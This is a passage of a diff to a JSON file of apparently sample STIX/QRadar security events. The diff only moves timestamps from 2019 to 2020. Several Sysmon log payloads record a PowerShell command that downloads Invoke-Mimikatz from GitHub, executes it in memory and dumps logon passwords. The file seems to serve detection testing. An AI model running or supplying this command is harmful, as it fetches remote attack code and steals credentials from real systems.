SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
                 "magnitude": 2
             },
-            "first_observed": "2019-10-14T23:58:01.652Z",
-            "last_observed": "2019-10-14T23:58:01.652Z",
+            "first_observed": "2020-01-14T23:58:01.652Z",
+            "last_observed": "2020-01-14T23:58:01.652Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--8debb7f7-5031-4581-8951-ebd73a9603ac",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:32.130Z",
-            "modified": "2019-10-16T17:19:32.130Z",
+            "created": "2020-01-16T17:19:32.130Z",
+            "modified": "2020-01-16T17:19:32.130Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -782,19 +782,19 @@
                 "log_source_id": 63,
                 "log_source_name": "Custom Rule Engine-8 :: qradar",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
                 "magnitude": 5
             },
-            "first_observed": "2019-10-10T14:47:19.804Z",
-            "last_observed": "2019-10-10T14:47:19.804Z",
+            "first_observed": "2020-01-10T14:47:19.804Z",
+            "last_observed": "2020-01-10T14:47:19.804Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--6851748e-0901-462b-a107-d3f3ff6c6a34",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:32.132Z",
-            "modified": "2019-10-16T17:19:32.132Z",
+            "created": "2020-01-16T17:19:32.132Z",
+            "modified": "2020-01-16T17:19:32.132Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -860,19 +860,19 @@
                 "log_source_id": 112,
                 "log_source_name": "WinServer",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
                 "magnitude": 6
             },
-            "first_observed": "2019-10-10T14:47:19.690Z",
-            "last_observed": "2019-10-10T14:47:19.690Z",
+            "first_observed": "2020-01-10T14:47:19.690Z",
+            "last_observed": "2020-01-10T14:47:19.690Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--58523a5a-2769-4f90-aa65-9f18a6126a25",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:32.134Z",
-            "modified": "2019-10-16T17:19:32.134Z",
+            "created": "2020-01-16T17:19:32.134Z",
+            "modified": "2020-01-16T17:19:32.134Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -936,19 +936,19 @@
                 "log_source_id": 63,
                 "log_source_name": "Custom Rule Engine-8 :: qradar",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
                 "magnitude": 8
             },
-            "first_observed": "2019-10-10T14:47:19.832Z",
-            "last_observed": "2019-10-10T14:47:19.832Z",
+            "first_observed": "2020-01-10T14:47:19.832Z",
+            "last_observed": "2020-01-10T14:47:19.832Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--c12447af-8601-4b58-809b-0c3029d2c099",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:32.135Z",
-            "modified": "2019-10-16T17:19:32.135Z",
+            "created": "2020-01-16T17:19:32.135Z",
+            "modified": "2020-01-16T17:19:32.135Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -1018,19 +1018,19 @@
                 "log_source_id": 112,
                 "log_source_name": "WinServer",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
                 "magnitude": 6
             },
-            "first_observed": "2019-10-10T16:42:58.030Z",
-            "last_observed": "2019-10-10T16:42:58.030Z",
+            "first_observed": "2020-01-10T16:42:58.030Z",
+            "last_observed": "2020-01-10T16:42:58.030Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--c91b7dc1-fc06-44c6-94ba-f6e1d1490707",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:32.137Z",
-            "modified": "2019-10-16T17:19:32.137Z",
+            "created": "2020-01-16T17:19:32.137Z",
+            "modified": "2020-01-16T17:19:32.137Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -1098,20 +1098,20 @@
                 "log_source_id": 63,
                 "log_source_name": "Custom Rule Engine-8 :: qradar",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
                 "magnitude": 8
             },
-            "first_observed": "2019-10-10T16:42:58.149Z",
-            "last_observed": "2019-10-10T16:42:58.149Z",
+            "first_observed": "2020-01-10T16:42:58.149Z",
+            "last_observed": "2020-01-10T16:42:58.149Z",
             "number_observed": 1
         },
         {
-            "created": "2019-08-23T14:35:12.264Z",
+            "created": "2020-01-23T14:35:12.264Z",
             "created_by_ref": "identity--49a7f37c-1f9f-4034-ba40-ec1e3625edf9",
-            "first_observed": "2019-08-23T14:35:12.264Z",
+            "first_observed": "2020-01-23T14:35:12.264Z",
             "id": "observed-data--0b634901-6947-4dde-9677-5856ccd3b642",
-            "last_observed": "2019-08-23T14:35:12.264Z",
-            "modified": "2019-08-23T14:35:12.264Z",
+            "last_observed": "2020-01-23T14:35:12.264Z",
+            "modified": "2020-01-23T14:35:12.264Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -1166,16 +1166,16 @@
                 "qid_name": "New File On Network",
                 "utf8_payload": "LEEF:1.0|Bit9|Parity|192.168.0.1|New_file_on_network|cat=Discovery\tsev=4\tdevTime=Jun 14 2010 10:25:35.000 UTC\tmsg=Server discovered new file 'c:\\Program Files\\QRadar\\file1.ext' \texternalId=12\tsrc=192.168.11.44\tsrcHostName=CLIO\tsrcProcess=c:\\Program Files\\QRadar_v1\\Administrator\tfilePath=c:\\Program Files\\QRadar\\file1.ext\tfileName=uat_file_5.msi\tfileHash=dce9a06646113dec4aec515b3c9a3c9eab9d20cca45beea015281c376c09b3d7\tfileId=42\tpolicy=Default Policy\tdstHost=megane\n"
             },
-            "first_observed": "2019-10-10T16:42:58.149Z",
-            "last_observed": "2019-10-10T16:42:58.149Z",
+            "first_observed": "2020-01-10T16:42:58.149Z",
+            "last_observed": "2020-01-10T16:42:58.149Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--4d9093df-3be7-421a-81d2-8ceedf1f3838",
             "type": "observed-data",
             "created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
-            "created": "2019-10-10T19:28:19.713Z",
-            "modified": "2019-10-10T19:28:19.713Z",
+            "created": "2020-01-10T19:28:19.713Z",
+            "modified": "2020-01-10T19:28:19.713Z",
             "objects": {
               "0": {
                 "type": "ipv4-addr",
@@ -1222,19 +1222,19 @@
               "log_source_id": 212,
               "log_source_name": "OSQuery @ localhost",
               "identity_ip": "0.0.0.0",
-              "utf8_payload": "<13>Sep  26 10:03:53 localhost osquery: {\"name\":\"pack_qradar_container_processes\",\"hostIdentifier\":\"localhost.localdomain\",\"calendarTime\":\"Fri Sep  26 12:13:24 2019 UTC\",\"unixTime\":1569500004,\"epoch\":0,\"counter\":2504,\"decorations\":{\"host_uuid\":\"785E2142-FCE0-52FE-5E0C-B44089E6B909\",\"last_logged_in_user\":\"swat\"},\"columns\":{\"Unique_ID\":\"eeafe507fe2b46e2ecc0edf0d3996bf836e09b602cb961aedb58a650f387b27b-24829-24803-785E2142-FCE0-52FE-5E0C-B44089E6B909-docker_container_processes\",\"query_name\":\"docker_container_processes\",\"cmdline\":\"nfsd\",\"container_id\":\"eeafe507fe2b46e2ecc0edf0d3996b\",\"container_name\":\"/happy_beaver\",\"egid\":\"0\",\"euid\":\"0\",\"gid\":\"0\",\"image_id\":\"a2a15febcdf362f6115e801d37b5e60d6faaeedcb9896155e5fe9d754025be12\",\"process_name\":\"nfsd\",\"parent_process_name\":\"bash\",\"parent_process_path\":\"/usr/bin/bash\",\"pgroup\":\"24829\",\"pid\":\"24829\",\"sgid\":\"0\",\"sha256\":\"29d8873d096c9abb3e9a6584c992ee60\",\"state\":\"S\",\"suid\":\"0\",\"uid\":\"0\",\"user\":\"swat\"},\"action\":\"added\"}\n",
+              "utf8_payload": "<13>Sep  26 10:03:53 localhost osquery: {\"name\":\"pack_qradar_container_processes\",\"hostIdentifier\":\"localhost.localdomain\",\"calendarTime\":\"Fri Sep  26 12:13:24 2020 UTC\",\"unixTime\":1569500004,\"epoch\":0,\"counter\":2504,\"decorations\":{\"host_uuid\":\"785E2142-FCE0-52FE-5E0C-B44089E6B909\",\"last_logged_in_user\":\"swat\"},\"columns\":{\"Unique_ID\":\"eeafe507fe2b46e2ecc0edf0d3996bf836e09b602cb961aedb58a650f387b27b-24829-24803-785E2142-FCE0-52FE-5E0C-B44089E6B909-docker_container_processes\",\"query_name\":\"docker_container_processes\",\"cmdline\":\"nfsd\",\"container_id\":\"eeafe507fe2b46e2ecc0edf0d3996b\",\"container_name\":\"/happy_beaver\",\"egid\":\"0\",\"euid\":\"0\",\"gid\":\"0\",\"image_id\":\"a2a15febcdf362f6115e801d37b5e60d6faaeedcb9896155e5fe9d754025be12\",\"process_name\":\"nfsd\",\"parent_process_name\":\"bash\",\"parent_process_path\":\"/usr/bin/bash\",\"pgroup\":\"24829\",\"pid\":\"24829\",\"sgid\":\"0\",\"sha256\":\"29d8873d096c9abb3e9a6584c992ee60\",\"state\":\"S\",\"suid\":\"0\",\"uid\":\"0\",\"user\":\"swat\"},\"action\":\"added\"}\n",
               "magnitude": 5
             },
-            "first_observed": "2019-10-02T13:57:22.776Z",
-            "last_observed": "2019-10-02T13:57:22.776Z",
+            "first_observed": "2020-01-02T13:57:22.776Z",
+            "last_observed": "2020-01-02T13:57:22.776Z",
             "number_observed": 1
           },
           {
             "id": "observed-data--81afa14f-5463-4251-83ba-4aac261a5ea1",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:32.138Z",
-            "modified": "2019-10-16T17:19:32.138Z",
+            "created": "2020-01-16T17:19:32.138Z",
+            "modified": "2020-01-16T17:19:32.138Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -1302,11 +1302,11 @@
                 "log_source_id": 63,
